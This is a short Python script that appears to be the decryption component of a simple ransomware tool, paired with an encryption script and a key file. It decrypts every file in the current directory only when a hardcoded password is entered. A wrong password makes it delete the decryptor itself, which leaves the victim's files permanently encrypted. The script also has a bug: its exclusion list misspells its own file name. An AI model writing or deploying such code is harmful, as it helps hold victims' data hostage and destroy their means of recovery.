import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
        if file == "encrypt.py" or file == "thekey.key" or file == "dercypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)
with open("thekey.key","rb") as key:
        secretkey = key.read()
password = "jsKSO21?sk%SLµ"
usr_inp = input("password\n")
if password == usr_inp:
        for file in files:
                with open(file,"rb") as thefile:
                        content = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(content)
                with open(file , "wb") as thefile:
                        thefile.write(contents_decrypted)
else:
        os.remove("decrypt.py")
